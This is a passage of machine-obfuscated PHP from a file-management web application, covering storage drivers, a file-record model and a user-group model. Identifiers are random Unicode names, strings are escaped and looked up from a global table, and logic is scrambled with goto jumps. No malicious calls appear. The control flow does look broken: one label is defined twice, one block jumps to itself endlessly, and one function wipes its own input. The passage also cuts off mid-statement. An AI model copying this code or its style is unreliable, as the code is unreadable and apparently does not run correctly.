$this->hashMd5($dؙ) . $b䴛; } $a = $c𒓂[33]; $a = intval($b䴛 / $BΗ); goto f،; dЋ: fseek_64($c, $b䴛 - $A镊); $a .= fread($c, $A镊); fclose($c); goto b쪹; eݒ: } public function getContent($AĈщӑ) { $AĈщӑ = $this->iconvSystem($AĈщӑ); return file_get_contents($AĈщӑ); } public function setContent($fϹ, $d = '') { $fϹ = $this->iconvSystem($fϹ); $e = @file_put_contents($fϹ, $d, LOCK_EX); clearstatcache(); return $e === !1 ? !1 : !0; } public function fileSubstr($e˦, $F뜅 = 0, $e = false) { goto F˚; F˚: $d =& $_SERVER[Ť]; $e˦ = $this->iconvSystem($e˦); if ($e === !1) { $e = $this->size($e˦); } goto eз; eз: if ($e <= 0) { return $d[33]; } $aۅ = fopen($e˦, $d[1224]); if (!$aۅ) { return !1; } goto dܐ; dܐ: fseek_64($aۅ, $F뜅); $F互 = fread($aۅ, $e); fclose($aۅ); goto A; A: return $F互; goto Eڂ; Eڂ: } public function upload($c҂, $Aȍ܏, $bϪ֗ = false, $b = REPEAT_REPLACE) { $c = $this->copyFile($Aȍ܏, $c҂); return $c ? $this->getPathOuter($c҂) : !1; } public function setModifyTime($eñ躿, $EΌ = '') { @touch($eñ躿, intval($EΌ)); } public function download($bӪ, $F龛ͤ) { return $this->iconvSystem($bӪ); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($c) { parent::__construct($c); $this->signatureVersion($_SERVER[Ť][208]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($dǐ) { parent::__construct($dǐ); $this->signatureVersion($_SERVER[Ť][208]); } public function fileOutLink($bވ) { $cҽ =& $_SERVER[Ť]; if (substr($bވ, 0, 7) == $cҽ[1170]) { $bވ = $cҽ[1171] . substr($bވ, 7); } header($cҽ[156] . $bވ); die; } } goto Dӟ; D훕ܴ: class FileModel extends ModelBase { protected $tableName = "\151\x6f\137\146\151\154\145"; protected $tableMeta = array("\x74\141\x62\x6c\145\116\x61\x6d\x65" => "\x69\x6f\137\146\x69\x6c\145\x5f\x6d\x65\164\141", "\155\x65\x74\141\x46\x69\145\154\144" => "\x66\x69\x6c\145\x49\x44"); public function fileInfo($a녕) { $dӎ =& $_SERVER[Ť]; static $e = array(); if (!isset($e[$a녕])) { $d = $dӎ[1697]; $C߽ߊ = Model($dӎ[438])->field($d)->where(array($dӎ[436] => $a녕))->find(); $e[$a녕] = $C߽ߊ; } return $e[$a녕]; } public function addFileByContent($b = '', $f = '') { goto dΊߜ; dΊߜ: $eŌ =& $_SERVER[Ť]; $d݅ = TEMP_PATH . $eŌ[1698]; if (!is_dir($d݅)) { mk_dir($d݅); } goto f䐋; CѴ: if (file_exists($A)) { @unlink($A); } return $E; goto Fȥ; f䐋: $A = $d݅ . $eŌ[1699] . rand_string(16); file_put_contents($A, $b); $E = $this->addFile($A, $f, !0); goto CѴ; Fȥ: } public function createFileName($A҆) { goto E쫮Ɨ; C֎؜: if (!$fŽ && !Cache::get($dϒٗ)) { $fŽ = !0; $f寧 = IO::mkdir($B); if (!IO::exist($f寧 . $F֚[1701])) { IO::mkfile($f寧 . $F֚[1701]); } Cache::set($dϒٗ, 1, 3600 * 2); } return $cګٵ͓; goto Cц; E쫮Ɨ: $F֚ =& $_SERVER[Ť]; $Fʇ = IO::init($F֚[8]); $cګٵ͓ = $this->makeFilePath($A҆, $Fʇ); goto DĮɔ; DĮɔ: $B = $Fʇ->pathFather($cګٵ͓); static $fŽ = false; $dϒٗ = $F֚[1700] . md5($B); goto C֎؜; Cц: } public function makeFilePath($d兎, $E) { goto fʂ; c횦: $D = $c . rand_string(5) . short_id(100); $d兎 = str_replace($eվڇ[8], $eվڇ[70], KodIO::clear($d兎)); if (!$d兎) { $aܰ = $eվڇ[1704]; } goto C; C: switch ($aܰ) { case $eվڇ[1705]: $D = $D . $eվڇ[91] . $E->ext($d兎); if ($E->ext($d兎) == $eվڇ[1642]) { $D .= $eվڇ[1394]; } break; case $eվڇ[1706]: goto cҊ; a: if (IO::isTypeObject($D) && !IO::isUploadServer($D)) { $E = IO::setContent($D, $eվڇ[33]); if (!$E) { show_json($eվڇ[1711], !1); } } CacheLock::unlock($fӒ); break; goto aХ; FʲҞ: CacheLock::lock($fӒ); $C޿լ = IO::fileNameAuto($c, $d兎); $D = $c . $C޿լ; goto a; cҊ: $BפꞫ = Model($eվڇ[1093])->get($eվڇ[1390]); $e˄ = substr(md5($eվڇ[1707] . $BפꞫ . date($eվڇ[697])), 0, 8); $DՊɟ = KodIO::defaultDriver(); goto C߬; C߬: $c = $eվڇ[1091] . $DՊɟ[$eվڇ[383]] . $eվڇ[1708] . date($eվڇ[1709]) . $e˄ . $eվڇ[8]; if ($E->ext($d兎) == $eվڇ[1642]) { $d兎 .= $eվڇ[1394]; } $fӒ = $eվڇ[1710] . $c . $d兎; goto FʲҞ; aХ: case $eվڇ[1704]: break; default: break; } return $D; goto F; fʂ: $eվڇ =& $_SERVER[Ť]; $aܰ = Model($eվڇ[1093])->get($eվڇ[1702]); $c = KodIO::defaultIO() . date($eվڇ[1703]); goto c횦; F: } public function addFileByRemote($fï, $Fί, $Cʏ۴ = array()) { goto eӮ; fџ: $Aƛ = IO::hashMd5($fï, $AƋ); $C݌ˤ = KodIO::defaultDriver(); $f֩ё퐐 = array($Bﲼ[537] => IO::size($fï), $Bﲼ[1712] => 1, $Bﲼ[402] => $Fί, $Bﲼ[752] => $C݌ˤ[$Bﲼ[383]], $Bﲼ[403] => $fï, $Bﲼ[1713] => $Cʏ۴[$Bﲼ[168]] ? $Cʏ۴[$Bﲼ[168]] : IO::hashSimple($fï), $Bﲼ[1714] => $Aƛ ? $Aƛ : $AƋ); goto C܉; eӮ: $Bﲼ =& $_SERVER[Ť]; if (!IO::exist($fï)) { return !1; } $AƋ = $Cʏ۴[$Bﲼ[167]] ? $Cʏ۴[$Bﲼ[167]] : $Bﲼ[33]; goto fџ; C܉: if ($dх͆к = $this->addFileCheckExist($f֩ё퐐[$Bﲼ[168]], $f֩ё퐐[$Bﲼ[167]], $f֩ё퐐[$Bﲼ[77]])) { return $dх͆к; } return $this->addFileData($f֩ё퐐); goto D˻Ը; D˻Ը: } private function addFileData($f㳿) { $Eߋ =& $_SERVER[Ť]; if (!$f㳿) { return !1; } $f㳿[$Eߋ[77]] = intval($f㳿[$Eߋ[77]]); if (!$f㳿[$Eߋ[77]] && strlen($f㳿[$Eߋ[168]]) > 32) { $f㳿[$Eߋ[77]] = intval(substr($f㳿[$Eߋ[168]], 32)); } $Aԓ = $this->add($f㳿); return $this->find($Aԓ); } public function addFile($B츖, $b, $b؂ = false) { goto fߍ; fߍ: $CǬ = IO::hashSimple($B츖); $A = IO::hashMd5($B츖); $dល = IO::size($B츖); goto F֦; E٪Ƀ: $Aʮ = $this->addFileMake($B츖, $dល, $CǬ, $A, $b, $b؂); $b = $this->addFileData($Aʮ); CacheLock::unlock($Dʗ); goto eɗ; eɗ: return $b; goto a畉; F֦: $Dʗ = $_SERVER[Ť][1715] . $A; CacheLock::lock($Dʗ); if ($a = $this->addFileCheckExist($CǬ, $A, $dល)) { CacheLock::unlock($Dʗ); return $a; } goto E٪Ƀ; a畉: } public function addFileMake($bԑˎ, $cԯҪ, $cǳ, $dØ, $Bͅ, $E) { goto dޢ; E䬐: $C⹩ = get_path_this($Fɷ); if ($E) { $Eإ؞ = IO::move($bԑˎ, $b鈅׬, !1, $C⹩); } else { $Eإ؞ = IO::copy($bԑˎ, $b鈅׬, !1, $C⹩); } if (!$Eإ؞) { return !1; } goto E; dޢ: $b =& $_SERVER[Ť]; $Fɷ = $this->createFileName($Bͅ); $b鈅׬ = get_path_father($Fɷ); goto E䬐; E: $bʽ = KodIO::defaultDriver(); $Eӷ = array($b[537] => $cԯҪ, $b[1712] => 1, $b[402] => $Bͅ, $b[752] => $bʽ[$b[383]], $b[403] => $Fɷ, $b[1713] => $cǳ, $b[1714] => $dØ); return $Eӷ; goto C΃ۢ; C΃ۢ: } public function addFileCheckExist($dߋ, $D˰쭳, $BǗ) { $Eе =& $_SERVER[Ť]; $f = $this->findByHash($dߋ, $D˰쭳); if (!$f) { return !1; } $fٕ = array($Eе[1712] => intval($f[$Eе[1716]]) + 1, $Eе[537] => $BǗ); $this->where(array($Eе[436] => $f[$Eе[435]]))->save($fٕ); return $f; } public function remove($C) { $this->linkCountChange($C, !1); $this->clearEmpty(); return !0; } public function linkAdd($dׯܧ) { $this->linkCountChange($dׯܧ, !0); } public function linkCountChange($fܰ, $EѴ) { goto f͋; b: foreach ($c as $D => $dү) { $cв = $dү . $Bͤچ[33]; if (!$dݚ[$cв]) { $dݚ[$cв] = array(); } $dݚ[$cв][] = $D; } foreach ($dݚ as $dү => $AÞ) { if (!$AÞ) { continue; } $dү = $EѴ ? $dү : -intval($dү); $c = array($Bͤچ[435] => array($Bͤچ[7], $AÞ)); if ($dү < 0) { $c[$Bͤچ[1716]] = array($Bͤچ[943], abs($dү)); } $this->where($c)->setAdd($Bͤچ[1716], $dү); } goto b; f͋: $Bͤچ =& $_SERVER[Ť]; if (!$fܰ) { return; } if (!is_array($fܰ)) { $fܰ = array($fܰ); } goto B; B: $c = array(); foreach ($fܰ as $D) { $cв = $D . $Bͤچ[33]; if (!$c[$cв]) { $c[$cв] = 0; } $c[$cв]++; } $dݚ = array(); goto b; b: } public function findByHash($Bތ, $Cޕ佅 = false) { $Dȍ =& $_SERVER[Ť]; if (!$Bތ && !$Cޕ佅) { return !1; } $E˥ = array($Dȍ[1713] => $Bތ); if ($Cޕ佅) { $E˥ = array($Dȍ[1714] => $Cޕ佅); } return $this->order($Dȍ[1717])->where($E˥)->find(); } public function clearEmpty($eٜ = 0) { goto eȿ; Dû: foreach ($Eڊ as $c) { $B->update(1); $this->resetFile($c); } $B->end(); goto eݳ; EՈ: $Eڊ = $this->where($Eо̑)->select(); if (!$Eڊ) { return; } $B = new Task($c[1719], $c[33], count($Eڊ)); goto Dû; eȿ: $c =& $_SERVER[Ť]; $aʚ܆ = time() - 3600 * 24 * $eٜ; $Eо̑ = $c[1718] . $aʚ܆; goto EՈ; eݳ: } public function resetFile($fک) { goto F; F: $fܵ =& $_SERVER[Ť]; $A = array($fܵ[436] => $fک[$fܵ[435]]); $AΏ = Model($fܵ[1172])->where($A)->count(); goto bʍ; B؊˺: if ($fک[$fܵ[1716]] != $aۆǪ) { $this->where($A)->save(array($fܵ[1712] => $aۆǪ)); } goto aΚй; bʍ: $bّכ = Model($fܵ[1720])->where($A)->count(); $aۆǪ = intval($AΏ) + intval($bّכ); if ($aۆǪ == 0) { IO::remove($fک[$fܵ[75]]); $this->where($A)->delete(); $this->metaSet($fک[$fܵ[435]], null, null); return; } goto B؊˺; aΚй: } public function storageInfo($eվ = false) { goto b穅; b¶: $A = 1; $eƞ = 0; $D = 5000; goto a腐ݭ; b穅: $C =& $_SERVER[Ť]; $Dɔ = $this->count() + 0.0; $fƂ = 0; goto b¶; a腐ݭ: for ($f = 0; $f < $Dɔ; $f = $f + $D) { $fԡ = $this->limit($f, $f + $D)->select(); foreach ($fԡ as $F) { $A += $F[$C[77]] * $F[$C[1716]]; $fƂ += $F[$C[77]] * ($F[$C[1716]] - 1); $eƞ += $F[$C[1716]]; } } $CݏÇ = array($C[1721] => $A, $C[1722] => $fƂ, $C[1723] => $fƂ / $A, $C[81] => $Dɔ, $C[1724] => $eƞ); return $CݏÇ; goto b蕫; b蕫: } } class GroupModel extends ModelBase { protected $tableName = "\147\162\157\165\160"; protected $tableMeta = array("\164\x61\x62\x6c\x65\x4e\x61\155\x65" => "\147\x72\157\165\160\137\x6d\145\164\141", "\155\145\164\x61\x46\x69\x65\x6c\144" => "\147\x72\x6f\165\160\111\x44"); protected function cacheFunctionAlias($F΅ֱ) { $Dݯ =& $_SERVER[Ť]; return array($Dݯ[1725] => array($F΅ֱ[0], $Dݯ[1726]), $Dݯ[1727] => array($F΅ֱ[0], $Dݯ[1726])); } protected function getInfo($f) { $Bނ = $this->getInfoSimple($f); if (!$Bނ) { return !1; } return $this->_listDataApplyItem($Bނ); } protected function getInfoSimple($C¢, $f = false) { $b׍ =& $_SERVER[Ť]; if ($f) { $E⌓ = array($b׍[1652] => intval($C¢)); $D = $this->where($E⌓)->find(); return is_array($D) ? $D : array(); } return $this->cacheFunctionGet($b׍[1728], $C¢); } protected function groupAdd($d勘ѝ) { goto cՂ; A㳏: if (isset($d勘ѝ[$fЙ[1731]])) { $this->metaSet($aΤ̸, array($fЙ[1731] => $d勘ѝ[$fЙ[1731]], $fЙ[1732] => $d勘ѝ[$fЙ[1732]])); unset($d勘ѝ[$fЙ[1731]]); unset($d勘ѝ[$fЙ[1732]]); } Model($fЙ[1172])->groupRootAdd($aΤ̸); return $aΤ̸; goto Cį; cՂ: $fЙ =& $_SERVER[Ť]; if (!$d勘ѝ[$fЙ[478]] && isset($d勘ѝ[$fЙ[1652]]) && $d勘ѝ[$fЙ[1652]] == 1) { if ($C浕 = $this->getInfoSimple($d勘ѝ[$fЙ[1652]], !0)) { return $d勘ѝ[$fЙ[1652]]; } } else { $C浕 = $this->getInfoSimple($d勘ѝ[$fЙ[478]]); if (!$C浕) { return !1; } } $a = $fЙ[487]; goto DƗ̄; e: if (!empty($d勘ѝ[$fЙ[1652]])) { $dڳ󓆆[$fЙ[1652]] = $d勘ѝ[$fЙ[1652]]; } $aΤ̸ = $this->add($dڳ󓆆); $this->setNamePinyin($aΤ̸, $dڳ󓆆[$fЙ[28]]); goto A㳏; DƗ̄: if ($C浕[$fЙ[476]]) { $a = $C浕[$fЙ[476]] . $C浕[$fЙ[1652]] . $fЙ[47]; } $dڳ󓆆 = array($fЙ[402] => $this->groupNameAuto($d勘ѝ[$fЙ[478]], $d勘ѝ[$fЙ[28]]), $fЙ[384] => $d勘ѝ[$fЙ[478]], $fЙ[542] => $a, $fЙ[1729] => $d勘ѝ[$fЙ[1636]], $fЙ[1730] => 0, $fЙ[1656] => 0); if (isset($d勘ѝ[$fЙ[1675]])) { $dڳ󓆆[$fЙ[1675]] = $d勘ѝ[$fЙ[1675]]; } else { $C = $this->max($fЙ[1675]); if (!$C) { $C = 0; } $dڳ󓆆[$fЙ[1675]] = $C + 1; } goto e; Cį: } protected function groupEdit($b函, $cϸ) { $B˖ =& $_SERVER[Ť]; if (!empty($cϸ[$B˖[478]])) { $a׳ݱ = $this->getInfoSimple($b函); $CӇ = $this->getInfoSimple($cϸ[$B˖[478]]); if (!$a׳ݱ || !$CӇ) { return !1; } if ($a׳ݱ[$B˖[1652]] == $CӇ[$B˖[1652]]) { return !1; } if ($cϸ[$B˖[478]] != $a׳ݱ[$B˖[478]]) { if ($CӇ[$B˖[476]] !== $a׳ݱ[$B˖[476]] && strpos($CӇ[$B˖[476]], $a׳ݱ[$B˖[476]] . $a׳ݱ[$B˖[1652]] . $B˖[47]) === 0) { return !1; } $cϸ[$B˖[542]] = $CӇ[$B˖[476]] . $cϸ[$B˖[478]] . $B˖[47]; $this->_changeChildLevel($a׳ݱ, $CӇ); } } if (isset($cϸ[$B˖[28]])) { $this->setNamePinyin($b函, $cϸ[$B˖[28]]); } if (isset($cϸ[$B˖[1731]])) { $this->metaSet($b函, array($B˖[1731] => $cϸ[$B˖[1731]], $B˖[1732] => $cϸ[$B˖[1732]])); unset($cϸ[$B˖[1731]]); unset($cϸ[$B˖[1732]]); } return $this->where(array($B˖[1733] => $b函))->save($cϸ); } private function _changeChildLevel($c, $A, $eʉ = false) { goto F簄; F簄: $E =& $_SERVER[Ť]; $B = $c[$E[476]] . $c[$E[1652]] . $E[47]; $C֝Ćݶ = $A[$E[476]] . $A[$E[1652]] . $E[47] . $c[$E[1652]] . $E[47]; goto fë; Dƪ: $this->where($e߻)->data($D܌)->save(); goto A; fë: if ($eʉ) { $C֝Ćݶ = $A[$E[476]] . $A[$E[1652]] . $E[47]; } $e߻ = array($E[542] => array($E[500], $c[$E[476]] . $c[$E[1652]] . $E[501])); $D܌ = array($E[542] => array($E[550], "\x72\145\x70\154\x61\143\145\50\x70\141\162\145\156\164\x4c\x65\166\145\154\54\47{$B}\x27\x2c\x27{$C֝Ćݶ}\x27\x29")); goto Dƪ; A: } public function setNamePinyin($E붱, $B = false) { $E =& $_SERVER[Ť]; if (!$B) { $a = $this->getInfoSimple($E붱); $B = $a[$E[28]]; } if (!Input::check($B, $E[545])) { $this->metaSet($E붱, $E[432], null); $this->metaSet($E붱, $E[431], null); return; } $E = array($E[432] => str_replace($E[50], $E[33], Pinyin::encode($B)), $E[431] => Pinyin::encode($B, $E[546])); $this->metaSet($E붱, $E); } protected function groupStatus($F, $eϋ) { goto C; B: if ($eϋ == $c܄[83]) { $fᗼ = $this->parentLevelArray($Fֆч[$c܄[476]]); } else { $F = array($c܄[542] => array($c܄[500], $Fֆч[$c܄[476]] . $Fֆч[$c܄[1652]] . $c܄[501])); $fᗼ = $this->where($F)->field($c܄[1652])->select(); $fᗼ = array_to_keyvalue($fᗼ, $c܄[33], $c܄[1652]); } $fᗼ[] = $Fֆч[$c܄[1652]]; $Bݹ = array(); goto c; C: $c܄ =& $_SERVER[Ť]; $Fֆч = $this->getInfoSimple($F); if (!$Fֆч) { return !1; } goto B; c: foreach ($fᗼ as $F) { $Bݹ[] = array($c܄[1652] => $F, $c܄[89] => $c܄[699], $c܄[366] => $eϋ); } return Model($c܄[1734])->addAll($Bݹ, array(), !0); goto Fʲﴰ; Fʲﴰ: } protected function groupRemove($fճ) { goto b˹; b˹: $a݊ =& $_SERVER[Ť]; $a = array($a݊[1652] => $fճ); $bΫ = $this->where($a)->find(); goto Dۥ; Dۥ: if (!$bΫ || $bΫ[$a݊[478]] == 0) { return !1; } $Cڂ = $this->getInfoSimple($bΫ[$a݊[478]]); $this->_changeChildLevel($bΫ, $Cڂ, !0); goto e祈; e祈: $this->where(array($a݊[478] => $fճ))->save(array($a݊[478] => $bΫ[$a݊[478]])); Model($a݊[1734])->where($a)->delete(); Model($a݊[1735])->where($a)->delete(); goto EƉ; EƉ: Model($a݊[768])->groupRootRemove($fճ); return $this->where($a)->delete(); goto Fɗ; Fɗ: } protected function groupSort($E) { $Fי =& $_SERVER[Ť]; $Fښ = array(); foreach ($E as $Cڙ => $Cخ񋋏) { $Fښ[] = array($Fי[1652], $Cخ񋋏, $Fי[1675], $Cڙ + 1); } $this->saveAll($Fښ); } public function listData() { $E֋ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($E֋[$_SERVER[Ť][361]]); return $E֋; } private function _makeOrder($bȈ = '') { goto BڷЌ; D: $bȈ = $bȈ . "{$Břឈ}\x20{$e}\x2c\40\147\162\157\165\x70\111\104\40\141\163\143"; return $this->order($bȈ); goto C; cư: $Břឈ = Input::get($c٬[423], $c٬[7], $c٬[1656], $aȏ); $e = Input::get($c٬[424], $c٬[7], $c٬[1736], array($c٬[1736], $c٬[420])); $e = $D[$e]; goto D; BڷЌ: $c٬ =& $_SERVER[Ť]; $aȏ = array($c٬[1652], $c٬[28], $c٬[1638], $c٬[190]); $D = array($c٬[418] => $c٬[419], $c٬[420] => $c٬[421]); goto cư; C: } public function listChild($FǪՇ) { $A =& $_SERVER[Ť]; $e̜ = $this->where(array($A[478] => $FǪՇ))->_makeOrder()->selectPage(200); $this->_listDataApply($e̜[$A[361]]); return $e̜; } public function listByID($eׂ㈹) { $C홉 =& $_SERVER[Ť]; if (!$eׂ㈹) { return array(); } $cɢ = array($C홉[1652] => array($C홉[7], $eׂ㈹)); $b᥼ = $this->where($cɢ)->select(); $this->_listDataApply($b᥼); return $b᥼; } public function listSearch($D) { goto a֌; a֌: $C̒Ђ =& $_SERVER[Ť]; $D = $D[$C̒Ђ[1737]]; $d = isset($D[$C̒Ђ[1738]]) ? $D[$C̒Ђ[1738]] : !1; goto Cט; Cט: if (!trim($D)) { return !1; } $D = str_replace($C̒Ђ[1739], $C̒Ђ[1740], $D); $b = array($C̒Ђ[1652] => array($C̒Ђ[373], "{$D}\45"), $C̒Ђ[28] => array($C̒Ђ[373], "\x25{$D}\x25"), $C̒Ђ[928] => $C̒Ђ[1741]); goto d; Cɩ: return $Bͦ; goto a; d: if ($d) { $Fݘծ = $this->getInfoSimple($d); $D֮ΰ = $Fݘծ[$C̒Ђ[476]] . $d . $C̒Ђ[501]; $b = array($b, array($C̒Ђ[476] => array($C̒Ђ[373], $D֮ΰ))); } $b = $this->parseWhereLike($b); $Bͦ = $this->_makeOrder()->where($b)->selectPage(20); goto d솢; d솢: $Bͦ = $Bͦ ? $Bͦ : array(); if (!$Bͦ || count($Bͦ[$C̒Ђ[361]]) < 5 && Input::check($D, $C̒Ђ[312])) { goto C㧌׿; Eݎ弬: $cԚ = array_merge($C݃, $b, $Bͦ[$C̒Ђ[361]]); $Bͦ[$C̒Ђ[361]] = array_unique_by_key($cԚ, $C̒Ђ[1652]); $Bͦ[$C̒Ђ[358]][$C̒Ђ[359]] = count($Bͦ[$C̒Ђ[361]]); goto cֱʉ; cֱʉ: $Bͦ[$C̒Ђ[358]][$C̒Ђ[360]] = ceil($Bͦ[$C̒Ђ[358]][$C̒Ђ[359]] / $Bͦ[$C̒Ђ[358]][$C̒Ђ[356]]); goto D; C㧌׿: $bʹ = $this->groupChildrenAll($d); $C݃ = $this->_searchFromMeta($C̒Ђ[431], $D, 10, $bʹ); $b = $this->_searchFromMeta($C̒Ђ[432], $D, 10, $bʹ); goto Eݎ弬; D: } $this->_listDataApply($Bͦ[$C̒Ђ[361]]); goto Cɩ; a: } protected function groupChildrenAll($F׬פ) { $Dˤ =& $_SERVER[Ť]; if (!$F׬פ) { return !1; } if (is_string($F׬פ)) { $F׬פ = array($F׬פ); } $a = $F׬פ; foreach ($F׬פ as $fꝥ) { $A = $this->getInfoSimple($fꝥ); $e = array($Dˤ[476] => array($Dˤ[373], $A[$Dˤ[476]] . $fꝥ . $Dˤ[501])); $FɄٴ = $this->field($Dˤ[1652])->where($e)->select(); $a = array_merge($a, array_to_keyvalue($FɄٴ, $Dˤ[33], $Dˤ[1652])); } return array_unique($a); } private function _searchFromMeta($f刷, $E퉿, $AȈ風, $CД) { goto f; b򪜑: if (!$b֋ڄ) { return array(); } return $b֋ڄ; goto Eۭ; B⌱: if (!$c׵) { return array(); } $c׵ = array_to_keyvalue($c׵, $AÈ[33], $AÈ[1652]); $b֋ڄ = $this->where(array($AÈ[1733] => array($AÈ[7], $c׵)))->select(); goto b򪜑; f: $AÈ =& $_SERVER[Ť]; $E퉿 = strtolower($E퉿); $CăԠ = array($AÈ[89] => $f刷, $AÈ[366] => array($AÈ[373], "\45{$E퉿}\45")); goto E; E: $CăԠ = $this->parseWhereLike($CăԠ); if ($CД) { $CăԠ[$AÈ[1652]] = array($AÈ[7], $CД); } $c׵ = Model($AÈ[1742])->where($CăԠ)->limit($AȈ風)->select(); goto B⌱; Eۭ: } protected function _listDataApplyItem($bƶ) { $f۴ʃ = array($bƶ); $this->_listDataApply($f۴ʃ); return $f۴ʃ[0]; } protected function _listDataApply(&$f) { goto bˇ; bˇ: $FǇͺ =& $_SERVER[Ť]; if (!$f) { return; } $BΧ = array_to_keyvalue($f, $FǇͺ[33], $FǇͺ[1652]); goto E̮ڗ͖; Bю∳: $this->_listAppendParent($f); $this->_listAppendSourceRoot($f, $BΧ); goto D; E̮ڗ͖: $this->_listAppendChildren($f); $this->_listAppendChildrenMember($f); $this->_listAppendMeta($f, $BΧ); goto Bю∳; D: } private function _listAppendChildren(&$eՄɳ) { goto B̜; d: $b = count($eՄɳ); $EՐ = $this->tablePrefix . $this->tableName; for ($C紈 = 0, $d߉ݑ = 0; $C紈 < $b; $C紈++) { $d߉ݑ++; $CՑ = $eՄɳ[$C紈][$cĔ[1652]]; $Cӆ .= "\x53\105\114\x45\103\124\x20\x2a\x20\x46\122\117\x4d\x20\x28\123\105\114\105\103\124\x20\x27{$CՑ}\137\x63\x68\151\154\144\x27\x20\141\x73\40\150\x61\163\x20\x46\x52\117\115\40\x60{$EՐ}\x60\x20\167\150\145\x72\145\x20\160\x61\x72\145\x6e\164\111\104\x3d{$CՑ}\40\154\151\x6d\151\x74\40\x31\51\40\141\x73\40\x74\142\137{$CՑ}\x20\165\x6e\x69\157\x6e\40\141\154\x6c\40"; if (($d߉ݑ >= 20 || $C紈 == $b - 1) && $Cӆ) { $Cӆ = substr($Cӆ, 0, -strlen($cĔ[466])); $A = $this->query($Cӆ); $E = array_merge($E, $A); $d߉ݑ = 0; $Cӆ = $cĔ[33]; } } goto C; C: $E = array_to_keyvalue($E, $cĔ[467]); foreach ($eՄɳ as &$e҇̓) { $e҇̓[$cĔ[1743]] = isset($E[$e҇̓[$cĔ[1652]] . $cĔ[1744]]); } unset($e҇̓); goto eҊ܎; B̜: $cĔ =& $_SERVER[Ť]; $Cӆ = $cĔ[368]; $E = array(); goto d; eҊ܎: } private function _listAppendChildrenMember(&$Dل) { goto d∈; d∈: $BӋᚯ =& $_SERVER[Ť]; $Aۃ䷅ = $BӋᚯ[368]; $fԨ = array(); goto Bڍ; Bڍ: $C䚟 = count($Dل); $d = $this->tablePrefix . $BӋᚯ[1735]; for ($eّÏ = 0, $f = 0; $eّÏ < $C䚟; $eّÏ++) { $f++; $f㤣 = $Dل[$eّÏ][$BӋᚯ[1652]]; $Aۃ䷅ .= "\123\x45\x4c\105\103\124\x20\x2a\x20\106\x52\117\x4d\40\50\x53\x45\114\105\x43\x54\40\47{$f㤣}\137\x63\150\151\154\144\47\x20\141\x73\x20\150\141\x73\x20\106\122\x4f\115\40\140{$d}\140\40\x77\150\x65\162\x65\40\x67\162\x6f\x75\160\x49\x44\x3d{$f㤣}\x20\154\151\x6d\x69\x74\40\x31\51\40\x61\x73\40\x74\142\137{$f㤣}\x20\165\156\151\x6f\156\40\141\x6c\154\x20"; if (($f >= 20 || $eّÏ == $C䚟 - 1) && $Aۃ䷅) { $Aۃ䷅ = substr($Aۃ䷅, 0, -strlen($BӋᚯ[466])); $F۪ = $this->query($Aۃ䷅); $fԨ = array_merge($fԨ, $F۪); $f = 0; $Aۃ䷅ = $BӋᚯ[33]; } } goto BҬ; BҬ: $fԨ = array_to_keyvalue($fԨ, $BӋᚯ[467]); foreach ($Dل as &$fí) { $fí[$BӋᚯ[1745]] = isset($fԨ[$fí[$BӋᚯ[1652]] . $BӋᚯ[1744]]); } unset($fí); goto E˴; E˴: } private function _listAppendMeta(&$Fڳṍ, $D򞷾) { goto D; eȆ: foreach ($Fڳṍ as &$f׎) { $f׎[$BÃ[433]] = array(); if (isset($B[$f׎[$BÃ[1652]]])) { $f׎[$BÃ[433]] = $B[$f׎[$BÃ[1652]]]; } } unset($f׎); goto Aˣ; D: $BÃ =& $_SERVER[Ť]; $Cʴ = array($BÃ[1652] => array($BÃ[7], $D򞷾)); $B = Model($BÃ[1734])->where($Cʴ)->select(); goto dͣ; dͣ: $B = array_to_keyvalue_group($B, $BÃ[1652]); foreach ($B as &$B) { $B = array_to_keyvalue($B, $BÃ[89], $BÃ[366]); } unset($B); goto eȆ; Aˣ: } protected function parentLevelArray($AҘ) { $cݏ =& $_SERVER[Ť]; $AҘ = explode($cݏ[47], trim($AҘ, $cݏ[47])); $AҘ = array_remove_value($AҘ, $cݏ[485]); return $AҘ; } private function _listAppendParent(&$Bů) { goto Fӡ֣; FϾЋ: if ($Bˢ) { $fߎ = array($Dȑ[1733] => array($Dȑ[400], $Bˢ)); $BՍ = $this->field($Dȑ[1746])->where($fߎ)->select(); $D۱띠 = array_to_keyvalue($BՍ, $Dȑ[1652], $Dȑ[28]); $c󦥝 = array_merge_index($c󦥝, $D۱띠); } $dƒ = $GLOBALS[$Dȑ[6]][$Dȑ[84]][$Dȑ[1747]]; foreach ($Bů as &$a񸵋) { $C = $this->parentLevelArray($a񸵋[$Dȑ[476]]); $C덹 = $Dȑ[33]; foreach ($C as $Dභ => $A) { if ($dƒ && $Dභ == 0) { continue; } $C덹 .= $c󦥝[$A] . $Dȑ[8]; } if ($C) { $C덹 .= $a񸵋[$Dȑ[28]]; } $a񸵋[$Dȑ[480]] = str_replace($Dȑ[484], $Dȑ[8], $C덹); } goto A; A: unset($a񸵋); goto A; Fӡ֣: $Dȑ =& $_SERVER[Ť]; $c󦥝 = array(); foreach ($Bů as &$a񸵋) { $c󦥝[$a񸵋[$Dȑ[1652]]] = $a񸵋[$Dȑ[28]]; $C = $this->parentLevelArray($a񸵋[$Dȑ[476]]); foreach ($C as $A) { if (!isset($c󦥝[$A])) { $c󦥝[$A] = 0; } } } goto FѦ; FѦ: unset($a񸵋); $Bˢ = array(); foreach ($c󦥝 as $Dභ => $cӘ) { if (!$cӘ) { $Bˢ[] = $Dභ; } } goto FϾЋ; A: } private function _listAppendSourceRoot(&$aѡ, $F) { goto b؉փ; b؉փ: $DΠ =& $_SERVER[Ť]; $B鍭 = array($DΠ[387] => SourceModel::TYPE_GROUP, $DΠ[478] => 0, $DΠ[473] => array($DΠ[7], $F)); $Eؤƺ = $DΠ[1748]; goto e͔; b: foreach ($aѡ as &$Dݛ) { $Dݛ[$DΠ[407]] = $AԾ[$Dݛ[$DΠ[1652]]] ? $AԾ[$Dݛ[$DΠ[1652]]] : array(); } unset($Dݛ); goto E; e͔: $AԾ = Model($DΠ[768])->order($DΠ[1749])->field($Eؤƺ)->where($B鍭)->select(); $AԾ = array_to_keyvalue($AԾ, $DΠ[473]); $AԾ = array_remove_key($AԾ, $DΠ[473]); goto b; E: } protected function groupMerge($C) { $C = array_values(array_unique($C)); $C = array(); for ($A = 0; $A < count($C); $A++) { $Dꦝ = !1; for ($A = 0; $A < count($C); $A++) { if ($A == $A) { continue; } if 